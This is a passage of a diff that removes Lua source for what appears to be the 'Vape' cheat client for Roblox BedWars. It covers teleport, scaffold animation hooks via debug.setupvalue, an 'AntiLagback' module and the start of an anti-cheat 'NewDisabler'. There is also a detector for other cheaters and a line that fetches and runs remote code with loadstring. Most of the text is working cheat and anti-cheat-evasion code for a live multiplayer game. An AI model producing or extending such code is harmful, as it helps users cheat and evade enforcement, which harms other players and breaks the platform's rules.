-		Teleport = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-			Name = "Teleport",
-			Function = function(callback)
-				if callback then
-					task.spawn(function()
-						if entityLibrary.isAlive then
-							local selfBed = getNearestBed(true)
-							local position = teleportModes[TeleportMode.Value](selfBed)
-							if position then
-								teleportMethods[TeleportMethod.Value](position)
-							end
-						end
-						Teleport.ToggleButton(false)
-					end)
-				else
-					local movementControls = require(lplr.PlayerScripts.PlayerModule):GetControls()
-					movementControls:Enable()
-				end
-			end
-		})
-		TeleportSpeed = Teleport.CreateSlider({
-			Name = "Speed",
-			Min = 600,
-			Max = 1000,
-			Default = 800,
-			Function = blankFunction
-		})
-		local teleportmodes = {}
-		for i, v in next, teleportModes do
-			table.insert(teleportmodes, i)
-		end
-		TeleportMode = Teleport.CreateDropdown({
-			Name = "Mode",
-			List = teleportmodes,
-			Function = blankFunction
-		})
-		local teleportmethods = {}
-		for i, v in next, teleportMethods do
-			table.insert(teleportmethods, i)
-		end
-		TeleportMethod = Teleport.CreateDropdown({
-			Name = "Method",
-			List = teleportmethods,
-			Function = blankFunction
-		})
-	end)
-	
-	runFunction(function()
-		local NoCheatPlus = {Enabled = false}
-		--[=[
-			Detections
-			Chat A [detects chat messages with "<client>ware", "<client> on top", "clutcher", " | <client>" and "<client>v4" 
-			Name A [same thing as Chat A but filters names and displaynames]
-
-			InfiniteFly A [y check]
-			AntiVoid A [detects vape antivoid]
-			Projectiles A [detect projectile exploit]
-			Scaffold A [detect scaffold]
-			Aura A [detect chargeRatio :troll:]
-			
-			Simulation A [vertical detection]
-			Simulation B [horizontal detection]
-			Simulation C [knockback detection]
-		]=]
-
-		local AlwaysNotify = {Enabled = false}
-
-		local cheaterlist = {}
-	
-		local cheatfinder = {
-			ware = function(_string)
-				return _string:match("%a+ware") or _string:lower():match("%a+ware")
-			end,
-			piston = function(_string)
-				return _string:match("%a*piston%a*") or _string:lower():match("%a*piston%a*")
-			end,
-			ontop = function(_string)
-				return _string:match("(%a+)%s*on%s*top") or _string:lower():match("(%a+)%s*on%s*top")
-			end,
-			ending = function(_string)
-				local split = _string:split("|")
-				return #split > 1 and split[#split]:match("%s+(%a+)") or nil
-			end,
-			v4 = function(_string)
-				return _string:match("%a+%s*v4") or _string:match("%a+%s*V4")
-			end,
-			vape = function(_string)
-				return _string:gsub("%W+", ""):lower():match("helloiamusingtheinhalerclient") ~= nil and "vape"
-			end,
-			vapeprivate = function(_string)
-				return _string:gsub("%W+", ""):lower():match("helloimusinginhaler") ~= nil and "vape"
-			end,
-		}
-
-		local alreadysaidlist = {}
-
-		for name, client in next, bedwarsStore.whitelist.clientUsers do
-			alreadysaidlist[name] = true
-		end
-		
-		task.spawn(function()
-			for _string, client in next, bedwarsStore.whitelist.chatStrings1 do
-				local messages = MessageHandler:scan(_string)
-				for i, message in next, messages do
-					local plr = playersService:GetPlayerByUserId(tonumber(message.Name:match("%d+")))
-					local client = bedwarsStore.whitelist.chatStrings1[message.Text]
-					if plr ~= lplr and WhitelistFunctions.LocalPriority > 0 and client ~= nil and message.isWhisper and alreadysaidlist[plr.Name] == nil then
-						message.Object.Text = ""
-						alreadysaidlist[plr.Name] = true
-						warningNotification("Vape", plr.Name.." is using "..client.."!", 60)
-						WhitelistFunctions.CustomTags[plr.Name] = string.format("[%s] ", client:upper()..' USER')
-						bedwarsStore.whitelist.clientUsers[plr.Name] = client:upper()..' USER'
-						local ind, newent = entityLibrary.getEntityFromPlayer(plr)
-						if newent then entityLibrary.entityUpdatedEvent:Fire(newent) end
-					end
-				end
-			end
-		end)
-	
-		local function getExploit(_string)
-			for _, check in next, cheatfinder do
-				local match = check(_string)
-				if match then
-					return match
-				end
-			end
-		end
-	
-		local function matchName(plr)
-			return getExploit(plr.Name) or getExploit(plr.DisplayName)
-		end
-	   
-		if isfile("vape/Cheaters.json") then
-			cheaterlist = httpService:JSONDecode(readfile("vape/Cheaters.json"))
-		else
-			writefile("vape/Cheaters.json", httpService:JSONEncode(cheaterlist))
-		end
-		local notify
-		local logCheater
-
-		local AntiCheat = {Modules = {}, Toggles = {}}
-		do
-			local vapeShaLib = debug.getupvalues(rawget(WhitelistFunctions, "Hash"))[2]
-			vapeShaLib = type(vapeShaLib) == "table" and vapeShaLib or  loadstring(vapeGithubRequest("Libraries/sha.lua"))()
-			local reportedHashes = {}
-			AntiCheat.hash = vapeShaLib.sha512
-			function AntiCheat:Define(Detection : String, ...)
-				local Args = {...}
-				local Type
-				local Violations
-				local Check
-				for i, v in next, Args do
-					if type(v) == "string" then
-						Type = v
-					elseif type(v) == "number" then
-						Violations = v
-					elseif type(v) == "function" then
-						Check = v
-					end
-				end
-				Type = Type or "A"
-				Violations = Violations or 1
-				assert(Check ~= nil, "function expected for AntiCheat:Define() got nil")
-				if AntiCheat[Detection] == nil then
-					AntiCheat[Detection] = {}
-				end
-				if AntiCheat[Detection][Type] == nil then
-					local DetectionHandler = {}
-					DetectionHandler.info = function()
-						return Detection, Type
-					end
-					DetectionHandler.hash = function(player)
-						local detect, t = DetectionHandler.info()
-						return vapeShaLib.sha512(player.Name..detect..t)
-					end
-					DetectionHandler.get = function(player : Player)
-						return DetectionHandler[player] or 0
-					end
-					DetectionHandler.add = function(player : Player, Count : Number | Nil)
-						if DetectionHandler[player] == nil then
-							DetectionHandler[player] = 0
-						end
-						DetectionHandler[player] += Count or 1
-					end
-					DetectionHandler.set = function(player : Player, Count : Number)
-						DetectionHandler[player] = Count or 1
-					end
-					DetectionHandler.reset = function(player : Player)
-						DetectionHandler[player] = 0
-					end
-					DetectionHandler.check = function(player : Player)
-						return DetectionHandler.get(player, Type) >= Violations
-					end
-					DetectionHandler.report = function(player : Player)
-						if AlwaysNotify.Enabled or (DetectionHandler.get(player) == Violations) then
-							notify(player, DetectionHandler)
-						end
-						local hash = DetectionHandler.hash(player)
-						if reportedHashes[hash] == nil then
-							reportedHashes[hash] = true
-							local detect, t = DetectionHandler.info()
-							logCheater(player, detect.." "..t)
-						end
-					end
-					DetectionHandler.normal = function(player : Player)
-						DetectionHandler.add(player)
-						if DetectionHandler.check(player) then
-							DetectionHandler.report(player)
-						end
-					end
-					DetectionHandler.load = function()
-						if not DetectionHandler.loaded then
-							DetectionHandler.loaded = true
-							task.spawn(Check)
-						end
-					end
-					DetectionHandler.unloadfuncs = {}
-					DetectionHandler.addunload = function(func)
-						table.insert(DetectionHandler.unloadfuncs, func)
-					end
-					DetectionHandler.Connections = {}
-					DetectionHandler.unload = function()
-						DetectionHandler.loaded = false
-						for i, v in next, DetectionHandler.unloadfuncs do
-							task.spawn(v)
-						end
-						table.clear(DetectionHandler.unloadfuncs)
-						for i, v in next, DetectionHandler.Connections do
-							if v.Disconnect then pcall(function() v:Disconnect() end) continue end
-							if v.disconnect then pcall(function() v:disconnect() end) continue end
-						end
-						table.clear(DetectionHandler.Connections)
-					end
-					DetectionHandler.enabled = function()
-						return NoCheatPlus.Enabled and AntiCheat.Modules[Detection..Type].Enabled
-					end
-					local toggleFunc = function(callback)
-						if callback then
-							DetectionHandler.load()
-						else
-							DetectionHandler.unload()
-						end
-					end
-					table.insert(AntiCheat.Toggles, toggleFunc)
-					AntiCheat.Modules[Detection..Type] = NoCheatPlus.CreateToggle({
-						Name = `{Detection} {Type}`,
-						Function = toggleFunc
-					})
-					AntiCheat[Detection][Type] = DetectionHandler
-				end
-				return AntiCheat[Detection][Type]
-			end
-		end
-
-		notify = function(player, handler)
-			local _de, _ty = handler.info()
-			local msg = `[NCP] {player.DisplayName} failed {_de} {_ty}`
-			MessageHandler:publish(msg, handler.hash(player))
-		end
-	
-		logCheater = function(plr, reason)
-			cheaterlist[plr.UserId] = cheaterlist[plr.UserId] or {
-				Reasons = {}
-			}
-			if table.find(cheaterlist[plr.UserId].Reasons, reason) == nil then
-				table.insert(cheaterlist[plr.UserId].Reasons, reason)
-			end
-			warningNotification("NoCheatPlus", `Cheater detected\n{plr.DisplayName} ({reason})`, 12)
-			writefile("vape/Cheaters.json", httpService:JSONEncode(cheaterlist))
-		end
-		
-		local function checkCheater(plr : Player)
-			if plr == lplr then return end
-			local cheater = cheaterlist[plr.UserId] and cheaterlist[plr.UserId].Reasons[1]
-			cheater = cheater or matchName(plr)
-			if cheater then
-				logCheater(plr, cheater)
-			end
-		end
-
-		local function getHand(name : String)
-			local itemType = name or "invalid"
-			local metatab = bedwars.ItemTable[itemType]
-			return metatab and (metatab.sword and "sword" or metatab.block and "block" or itemType:find("bow") and "bow" or (itemType:find("axe") and itemType:find("pickaxe") == nil and itemType:find("void") == nil and "axe") or itemType:find("pick") and "pickaxe") or "invalid"
-		end
-	
-		NoCheatPlus = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-			Name = "NoCheatPlus",
-			Function = function(callback)
-				for _, toggle in next, AntiCheat.Toggles do
-					toggle(callback)
-				end
-			end
-		})
-
-		AlwaysNotify = NoCheatPlus.CreateToggle({
-			Name = "Always Notify",
-			Function = blankFunction
-		})
-
-		local antivoidypos = 0
-
-		local _InfiniteFly; _InfiniteFly = AntiCheat:Define("InfiniteFly", function()
-			repeat
-				task.wait(2)
-				if not _InfiniteFly.enabled() then break end
-				for _, player in next, entityLibrary.entityList do
-					if player.RootPart.Position.Y > 10000 then
-						_InfiniteFly.normal(player.Player)
-					end
-				end
-			until not NoCheatPlus.Enabled
-		end) -- y > 10000
-
-		local _AntiVoid; _AntiVoid = AntiCheat:Define("AntiVoid", 2, function()
-			if antivoidypos == 0 then
-				local lowestypos = 99999
-				for i,v in next, (bedwarsStore.blocks) do 
-					local newray = workspace:Raycast(v.Position + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
-					if i % 200 == 0 then 
-						task.wait(0.06)
-					end
-					if newray and newray.Position.Y <= lowestypos then
-						lowestypos = newray.Position.Y
-					end
-				end
-				antivoidypos = lowestypos - 4
-			end
-			local detectionpart = Instance.new("Part")
-			detectionpart.CanCollide = false
-			detectionpart.CanTouch = true
-			detectionpart.Size = Vector3.new(10000, 1, 10000)
-			detectionpart.Anchored = true
-			detectionpart.Transparency = 1
-			detectionpart.Position = Vector3.new(0, antivoidypos - 50, 0)
-			table.insert(_AntiVoid.Connections, detectionpart.Touched:Connect(function(touchedpart)
-				local model = touchedpart:FindFirstAncestorWhichIsA("Model")
-				if model and model.PrimaryPart then
-					local player = playersService:GetPlayerFromCharacter(model)
-					if player == lplr then return end
-					if player then
-						local ray = workspace:Raycast(oldpos, Vector3.new(0, -300, 0), bedwarsStore.blockRaycast)
-						if ray and (model:GetAttribute("InflatedBalloons") or 0) < 1 and not model:GetAttribute("SpawnProtection") and (tick() - model:GetAttribute("SpawnTime")) > 5 then
-							local oldpos = model.PrimaryPart.Position
-							task.wait(0.3)
-							local msg = `[NCP] Began antivoid testing for {player.DisplayName}`
-							MessageHandler:publish(msg, _AntiVoid.hash(player).."info")
-							if model.PrimaryPart.Position.Y > oldpos.Y then
-								_AntiVoid.normal(player)
-							end
-						end
-					end
-				end
-			end))
-			detectionpart.Parent = workspace
-			_AntiVoid.addunload(function()
-				detectionpart:Destroy()
-			end)
-		end) -- antivoid funny
-
-		--[=[local _ProjectilesA = AntiCheat:Define("Projectiles", "A", function()local protectileHits = {}
-			table.insert(_ProjectilesA.Connections, vapeEvents.ProjectileImpact.Event:Connect(function(tab)
-				if tab.hitEntity and tab.shooterPlayer then
-					if protectileHits[tab.hitEntity] then
-						table.clear(protectileHits[tab.hitEntity])
-					else
-						protectileHits[tab.hitEntity] = {}
-					end
-					protectileHits[tab.hitEntity].Ticked = tick() + 0.3
-					protectileHits[tab.hitEntity].Shooter = tab.shooterPlayer
-				end
-			end))
-			table.insert(_ProjectilesA.Connections, vapeEvents.EntityDamageEvent.Event:Connect(function(damageTable)
-				local player = playersService:GetPlayerFromCharacter(damageTable.fromEntity)
-				local victim = playersService:GetPlayerFromCharacter(damageTable.entityInstance) 
-				if player == lplr then return end
-				if player then
-					if damageTable.extra and damageTable.damageType == 2 and damageTable.damageCategories then
-						if damageTable.damage == math.huge then
-							local found = protectileHits[damageTable.entityInstance]
-							if found and found.Ticked > tick() then
-								_ProjectilesA.normal(found.Shooter)
-							end
-						end
-					end
-				end
-			end))
-		end) -- old funny]=]
-
-		local _ProjectilesB; _ProjectilesB = AntiCheat:Define("Projectiles", "B", 2, function()
-			table.insert(_ProjectilesB.Connections, vapeEvents.ProjectileLaunch.Event:Connect(function(launchTable)
-				local player = launchTable.shootingPlayer
-				if player and isAlive(player) then
-					local mag = (launchTable.position - player.Character.PrimaryPart.Position).magnitude
-					if mag > 12 then
-						_ProjectilesB.normal(player)
-					end
-				end
-			end))
-		end) -- protectile exploit
-
-		local _Scaffold; _Scaffold = AntiCheat:Define("Scaffold", 10, function()
-			table.insert(_Scaffold.Connections, vapeEvents.PlaceBlockEvent.Event:Connect(function(placeTable)
-				local player = placeTable.player
-				if player == lplr then return end
-				if player then
-					local suc, res = pcall(function()
-						return player.Character.HandInvItem.Value.Name ~= placeTable.blockType
-					end)
-					if suc and res then
-						_Scaffold.normal(player)
-					end
-				end
-			end))
-		end) -- hand check
-		
-		local _AuraA; _AuraA = AntiCheat:Define("Aura", "A", function()
-			table.insert(_AuraA.Connections, vapeEvents.EntityDamageEvent.Event:Connect(function(damageTable)
-				local player = playersService:GetPlayerFromCharacter(damageTable.fromEntity)
-				local victim = playersService:GetPlayerFromCharacter(damageTable.entityInstance)
-				if player == lplr then
-					return
-				end
-				if player then
-					if damageTable.extra and damageTable.extra.chargeRatio == 0.999 then -- I love detectable aura (no hate to xylex because what he found was funny)
-						local allowed = false
-						for _, item in next, bedwars.getInventory(plr).items do
-							local itemMeta = bedwars.ItemTable[item.itemType]
-							if itemMeta.sword and itemMeta.sword.chargedAttack and itemMeta.sword.chargedAttack.maxChargeTimeSec then
-								allowed = true
-								break
-							end
-						end
-						if not allowed then
-							_AuraA.normal(player)
-						end
-					end
-				end
-			end))
-		end) -- chargeRatio == 0.999
-
-		local _ChatA; _ChatA = AntiCheat:Define("Chat", function()
-			table.insert(_ChatA.Connections, textChatService.MessageReceived:Connect(function(message)
-				if message.TextSource then
-					local plr = playersService:GetPlayerByUserId(message.TextSource.UserId)
-					if plr == lplr then return end
-					if plr then
-						local exploit = getExploit(message.Text)
-						if exploit then
-							logCheater(plr, exploit)
-						end
-					end
-				end
-			end))
-		end)
-		
-		local _NameA; _NameA = AntiCheat:Define("Name", function()
-			table.insert(_NameA.Connections, playersService.PlayerAdded:Connect(checkCheater))
-			for _, player in next, playersService:GetChildren() do
-				task.spawn(checkCheater, player)
-			end
-		end)
-
-		local getDirection
-		local applyKnockbackDirection
-		local knockbackConstants = {
-			kbUpwardStrength = 10000, 
-			kbDirectionStrength = 11750, 
-			kbStandardMass = 300
-		}
-		local function applyKnockback(part, mass, frompos, multi)
-			return applyKnockbackDirection(part, mass, getDirection(part.Position, frompos), multi)
-		end
-		getDirection = function(p5, frompos)
-			if not frompos then
-				return Vector3.zero
-			end
-			local xdir = frompos
-			if xdir ~= nil then
-				xdir = xdir.X
-			end
-			local xdir2 = xdir
-			if xdir2 == nil then
-				xdir2 = 0
-			end
-			local zdir = frompos
-			if zdir ~= nil then
-				zdir = zdir.Z
-			end
-			local zdir2 = zdir
-			if zdir2 == nil then
-				zdir2 = 0
-			end
-			local dir = Vector3.new(p5.X, 0, p5.Z) - Vector3.new(xdir2, 0, zdir2)
-			if dir.Magnitude == 0 then
-				return Vector3.zero
-			end
-			return dir.Unit
-		end
-	
-		local calculateKnockbackVelocity = blankFunction
-		local function calculateKnockbackVelocityRelative(part, mass, frompos, multi)
-			return calculateKnockbackVelocity(getDirection(part.Position, frompos), mass, multi)
-		end
-		calculateKnockbackVelocity = function(dir, mass, multi)
-			if dir.Magnitude == 0 then
-				return Vector3.new(0, 0, 0)
-			end
-			local vmulti = multi
-			if vmulti ~= nil then
-				vmulti = vmulti.vertical
-			end
-			local vmulti2 = vmulti
-			if vmulti2 == nil then
-				vmulti2 = 1
-			end
-			local hmulti = multi
-			if hmulti ~= nil then
-				hmulti = hmulti.horizontal
-			end
-			local hmulti2 = hmulti
-			if hmulti2 == nil then
-				hmulti2 = 1
-			end
-			local yvelo = Vector3.new(0, knockbackConstants.kbUpwardStrength * vmulti2, 0)
-			dir = dir.Unit * (knockbackConstants.kbDirectionStrength * hmulti2)
-			return (yvelo + dir) * (mass / knockbackConstants.kbStandardMass)
-		end
-	
-		local function getHumanoid(character)
-			local humanoid = character:FindFirstChildWhichIsA("Humanoid")
-			if humanoid then
-				return humanoid
-			end
-			if not character.Parent then
-				return nil
-			end
-			return getHumanoid(character.Parent)
-		end
-		applyKnockbackDirection = function(part, mass, dir, multi)
-			if dir.Magnitude == 0 then
-				return Vector3.new(0, 0, 0)
-			end
-			local velo = calculateKnockbackVelocityRelative(part, mass, dir, multi)
-			local humanoid = part:FindFirstChildWhichIsA("Humanoid")
-			local humanoid2
-			if humanoid then
-				humanoid2 = humanoid
-			elseif part.Parent then
-				humanoid2 = getHumanoid(part.Parent)
-			else
-				humanoid2 = nil
-			end
-			if humanoid2 then
-				humanoid2.PlatformStand = true
-				task.delay(0, function()
-					if humanoid2.Parent then
-						humanoid2.PlatformStand = false
-					end
-				end)
-			end
-			part:ApplyImpulse(velo)
-			return velo
-		end
-		local lastKnockbackTime = {}
-		local simulationObjects = {}
-
-		local oldJumps = {}
-		local _SimulationMain
-		local _SimulationA
-		local _SimulationB
-		
-		_SimulationMain = AntiCheat:Define("Simulation", "Main (BETA)", function()
-			table.insert(_SimulationMain.Connections, entityLibrary.entityRemovedEvent:Connect(function(ent)
-				if ent.Character then
-					simulationObjects[ent.Character] = nil
-				end
-			end))
-			local handleEntity = function(ent)
-				ent.Character.Archivable = true
-				for i, v in next, ent.Character:GetDescendants() do
-					v.Archivable = true
-				end
-				local Clone = ent.Character:Clone()
-				for i, v in next, Clone:GetDescendants() do
-					if v:IsA("BasePart") then
-						v.Transparency = 0.7
-					end
-				end
-				Clone.PrimaryPart.Transparency = 0
-				Clone.PrimaryPart.Color = Color3.new(0.4, 1, 0.4)
-				simulationObjects[ent.Character] = {
-					Entity = ent,
-					Sim = Clone,
-					simHumanoid = Clone.Humanoid,
-					simRoot = Clone.PrimaryPart
-				}
-				table.insert(_SimulationMain.Connections, ent.Player:GetAttributeChangedSignal("LastTeleported"):Connect(function()
-					Clone.PrimaryPart.CFrame = ent.RootPart.CFrame
-				end))
-			end
-			table.insert(_SimulationMain.Connections, entityLibrary.entityAddedEvent:Connect(handleEntity))
-			for i, v in next, entityLibrary.entityList do task.spawn(handleEntity, v) end
-
-			task.spawn(function()
-				repeat
-					task.wait()
-					for i, v in next, simulationObjects do
-						if oldJumps[v.Sim] == nil then
-							oldJumps[v.Sim] = 0
-						end
-						if v.Entity.Jumps > oldJumps[v.Sim] then
-							if v.simHumanoid.FloorMaterial ~= Enum.Material.Air then
-								v.simRoot.Velocity += Vector3.new(0, v.Entity.Humanoid.JumpPower, 0)
-							else
-								local msg = `[NCP] {player.DisplayName} had an invalid jump`
-								MessageHandler:publish(msg, _SimulationA.hash(v.Entity.Player))
-							end
-						end
-						oldJumps[v.Sim] = v.Entity.Jumps
-						v.simRoot.Velocity = fixVec(v.Entity.Humanoid.MoveDirection) * (v.Entity.Humanoid.WalkSpeed + 3)
-						if _SimulationA.enabled() then
-							if math.abs(v.simRoot.Position.Y - v.Entity.RootPart.Position.Y) > 7 then
-								_SimulationA.normal(v.Entity.Player)
-							end
-						end
-						if _SimulationB.enabled() then
-							if (fixVec(v.simRoot.Position) - fixVec(v.Entity.RootPart.Position)).Magnitude > 7 then
-								_SimulationB.normal(v.Entity.Player)
-							end
-						end
-					end
-				until not _SimulationMain.enabled()
-			end)
-			_SimulationMain.addunload(function()
-				for i, v in next, simulationObjects do
-					pcall(function() v.simRoot:Destroy() end)
-					table.clear(v)
-					simulationObjects[i] = nil
-				end
-			end)
-		end)
-		_SimulationA = AntiCheat:Define("Simulation", "A (BETA)", blankFunction)
-		_SimulationB = AntiCheat:Define("Simulation", "B (BETA)", blankFunction)
-
-		local _SimulationC; _SimulationC = AntiCheat:Define("Simulation", "C (BETA)", function()
-			table.clear(lastKnockbackTime)
-			table.insert(_SimulationC.Connections, vapeEvents.EntityDamageEvent.Event:Connect(function(damageTable)
-				if (damageTable.damageType ~= 0 or damageTable.extra and damageTable.extra.chargeRatio ~= nil) and damageTable.entityInstance ~= lplr.Character then
-					local RootPart = damageTable.entityInstance.PrimaryPart;
-					if RootPart then
-						local frompos = nil
-						if damageTable.fromPosition then
-							frompos = Vector3.new(damageTable.fromPosition.X, damageTable.fromPosition.Y, damageTable.fromPosition.Z)
-						end
-						if frompos == nil and damageTable.fromEntity and damageTable.fromEntity.PrimaryPart then
-							frompos = damageTable.fromEntity.PrimaryPart.Position
-						end
-						local disabled = damageTable.knockbackMultiplier
-						if disabled ~= nil then
-							disabled = disabled.disabled
-						end
-						if not disabled then
-							local simExists = simulationObjects[damageTable.entityInstance]
-							local SimPart = simExists and simExists.simRoot
-							simExists = nil
-							if SimPart == nil then
-								MessageHandler:publish("[NCP] Simulation root missing", "KnockbackRoot")
-								return
-							end
-							local RootAssemblyMass = SimPart
-							if RootAssemblyMass ~= nil then
-								RootAssemblyMass = RootAssemblyMass.AssemblyMass
-							end
-							local Mass = RootAssemblyMass
-							if Mass == 0 or Mass ~= Mass or not Mass then
-								Mass = 0
-							end
-							if lastKnockbackTime[damageTable.entityInstance] == nil then
-								lastKnockbackTime[damageTable.entityInstance] = 0
-							end
-							if workspace:GetServerTimeNow() - lastKnockbackTime[damageTable.entityInstance] <= 0.05 then
-								MessageHandler:publish("[NCP] Simulation skipped knockback", "KnockbackTime")
-								return
-							end
-							applyKnockback(SimPart, Mass, frompos, damageTable.knockbackMultiplier)
-							lastKnockbackTime[damageTable.entityInstance] = workspace:GetServerTimeNow()
-						end
-					end
-				end
-			end))
-		end)
-	end)
-
-	runFunction(function()
-		local ScaffoldPlus = {Enabled = false}
-		local ScaffoldNoSwing = {Enabled = false}
-		local oldViewmodel
-		local gameAnimationPlayer
-
-		ScaffoldPlus = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-			Name = "ScaffoldPlus",
-			Function = function(callback)
-				if callback then
-					task.spawn(function()
-						oldViewmodel = bedwars.ViewmodelController.playAnimation
-						bedwars.ViewmodelController.playAnimation = function(Self, id, ...)
-							if ScaffoldNoSwing.Enabled and id == 14 then
-								return
-							end
-							return oldViewmodel(Self, id, ...)
-						end
-						gameAnimationPlayer = debug.getupvalue(bedwars.BlockPlacer.placeBlock, 4)
-						local newAnimationPlayer = tutils.deepCopy(gameAnimationPlayer)
-						newAnimationPlayer.playAnimation = function(Self, instance, id, ...)
-							if ScaffoldNoSwing.Enabled and id == "rbxassetid://4866397461" then
-								return
-							end
-							return gameAnimationPlayer.playAnimation(Self, instance, id, ...)
-						end
-						debug.setupvalue(bedwars.BlockPlacer.placeBlock, 4, newAnimationPlayer)
-					end)
-				else
-					task.spawn(function()
-						if oldViewmodel then
-							bedwars.ViewmodelController.playAnimation = oldViewmodel
-						end
-						if gameAnimationPlayer then
-							debug.setupvalue(bedwars.BlockPlacer.placeBlock, 4, gameAnimationPlayer)
-						end
-					end)
-				end
-			end
-		})
-		ScaffoldNoSwing = ScaffoldPlus.CreateToggle({
-			Name = "No Swing",
-			Function = blankFunction,
-			Default = true,
-			HoverText = "no place animations (2021 scaffold)"
-		})
-	end)
-
-	runFunction(function()
-		local AntiLagback = {Enabled = false}
-		local MaxLatency = {Value = 200}
-		local MaxCompensation = {Value = 23}
-		local ScaffoldSave = {Enabled = false}
-		local InfiniteFlySave = {Enabled = false}
-
-		local RetoggleSpeed = false
-		local isfrozentick = tick()
-		local isfrozen = false
-		local realregionremote = bedwars.ClientHandler:Get("FetchServerRegion").instance
-
-		AntiLagback = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
-			Name = "AntiLagback",
-			HoverText = "Attempts to prevent flagging from ping spikes",
-			Function = function(callback)
-				if callback then
-					task.spawn(function()
-						repeat
-							task.wait()
-							local _tick = tick()
-							local result
-							task.spawn(function()
-								result = realregionremote:InvokeServer()
-							end)
-							repeat
-								task.wait()
-								if result then
-									result = tick() - _tick
-									break
-								end
-							until (tick() - _tick) > (MaxLatency.Value / 100)
-							result = result or 999999
-
-							if (result > (MaxLatency.Value / 100)) and not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled then
-								warningNotification("AntiLagback", "Ping spike detected, compensating movement.", 2)
-								if entityLibrary.isAlive then
-									freezetick = tick() + 2
-									if not isfrozen then
-										isfrozen = true
-										local oldpos = entityLibrary.character.HumanoidRootPart.Position
-										local movementControls = require(lplr.PlayerScripts.PlayerModule):GetControls()
-										local disabledControls
-										task.spawn(function()
-											repeat
-												task.wait()
-											until (entityLibrary.character.HumanoidRootPart.Position - oldpos).Magnitude > MaxCompensation.Value or not isfrozen
-											if not isfrozen then
-												local groundPos = entityLibrary.character.HumanoidRootPart.Position - Vector3.new(0, 3, 0)
-												if not getPlacedBlock(groundPos) then
-													if ScaffoldSave.Enabled then
-														local toggledScaffold
-														if not GuiLibrary.ObjectsThatCanBeSaved.ScaffoldOptionsButton.Api.Enabled then
-															GuiLibrary.ObjectsThatCanBeSaved.ScaffoldOptionsButton.Api.ToggleButton(false)
-															toggledScaffold = true
-														end
-														local start = tick() + 1.7
-														repeat
-															task.wait()
-														until (start <= tick()) or getPlacedBlock(groundPos) or not isfrozen
-														if GuiLibrary.ObjectsThatCanBeSaved.ScaffoldOptionsButton.Api.Enabled and toggledScaffold then
-															GuiLibrary.ObjectsThatCanBeSaved.ScaffoldOptionsButton.Api.ToggleButton(false)
-														end
-													end
-													--[=[if InfiniteFlySave.Enabled then
-														if not isfrozen and not getPlacedBlock(groundPos) then
-															GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.ToggleButton(false)
-															repeat
-																task.wait()
-															until not isfrozen
-															GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.ToggleButton(false)
-														end
-													end]=]
-												end
-											end
-										end)
-										task.spawn(function()
-											repeat
-												if not AntiLagback.Enabled then break end
-												if entityLibrary.isAlive and (entityLibrary.character.HumanoidRootPart.Position - oldpos).Magnitude > MaxCompensation.Value then
-													if GuiLibrary.ObjectsThatCanBeSaved.SpeedOptionsButton.Api.Enabled then
-														GuiLibrary.ObjectsThatCanBeSaved.SpeedOptionsButton.Api.ToggleButton(false)
-														RetoggleSpeed = true
-													end
-													if not disabledControls then
-														disabledControls = true
-														movementControls:Disable()
-													end
-													entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(0, entityLibrary.character.HumanoidRootPart.Velocity.Y, 0)
-												end
-												task.wait()
-											until not isfrozen
-											movementControls:Enable()
-											if not GuiLibrary.ObjectsThatCanBeSaved.SpeedOptionsButton.Api.Enabled then
-												if RetoggleSpeed then
-													GuiLibrary.ObjectsThatCanBeSaved.SpeedOptionsButton.Api.ToggleButton(false)
-													RetoggleSpeed = false
-												end
-											end
-										end)
-									end
-								end
-							else
-								if isfrozen and freezetick <= tick() then
-									isfrozen = false
-								end
-							end
-						until not AntiLagback.Enabled
-					end)
-				end
-			end
-		})
-		MaxLatency = AntiLagback.CreateSlider({
-			Name = "Max Latency",
-			HoverText = "Maximum latency until compensating movement",
-			Min = 0,
-			Max = 400,
-			Double = 100,
-			Default = 200,
-			Function = blankFunction
-		})
-		MaxCompensation = AntiLagback.CreateSlider({
-			Name = "Compensation",
-			HoverText = "Maximum distance you can move",
-			Min = 0,
-			Max = 30,
-			Default = 23,
-			Function = blankFunction
-		})
-		ScaffoldSave = AntiLagback.CreateToggle({
-			Name = "Scaffold",
-			HoverText = "Toggle Scaffold if you are over the void",
-			Default = true,
-			Function = blankFunction
-		})
-		--[=[InfiniteFlySave = AntiLagback.CreateToggle({
-			Name = "InfiniteFly",
-			HoverText = "Toggle InfiniteFly if you are over the void, (this is a fallback if you have infinitefly enabled)",
-			Default = true,
-			Function = blankFunction
-		})]=]
-	end)
-	
-	local NewDisablerSlowdown = {Enabled = false}
-	local NewDisablerAutoConfigure = {Enabled = false}
-	runFunction(function()
-		local NewDisabler = {Enabled = false}
-		local NewDisablerSpeed = {Enabled = false}
-		local realDisabler = tick()
-		local fixedPingPosition = false
-
-		local AutoConfigNumbers = {
-			BaseLerp = 0.24,
-			FLerp = 0.018,
-			BaseFreq = 0.15,
-			FFreq = 0.028
-		}
-
-		local function autoConfigure()
-			local newlerp = AutoConfigNumbers.BaseLerp + (math.ceil(bedwarsStore.disablerSpeed / 10) * AutoConfigNumbers.FLerp)
-			local newfreq = AutoConfigNumbers.BaseFreq + (math.ceil(bedwarsStore.disablerSpeed / 10) * AutoConfigNumbers.FFreq)
-			GuiLibrary.ObjectsThatCanBeSaved.PingBypassLerpSlider.Api.SetValue(newlerp * 100)
-			GuiLibrary.ObjectsThatCanBeSaved.PingBypassFrequencySlider.Api.SetValue(newfreq * 100)
-		end
-	
-		NewDisabler = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-			Name = "NewDisabler",
-			Function = function(callback)
-				if callback then
-					task.spawn(function()
-						local oldVec = Vector3.zero
-						task.spawn(function()
-							table.insert(NewDisabler.Connections, vapeEvents.ScytheApplyState.Event:Connect(function(applyTable)
-								if applyTable.player == lplr then
-									realDisabler = tick() + 1.4
-								end
-							end))
-							repeat
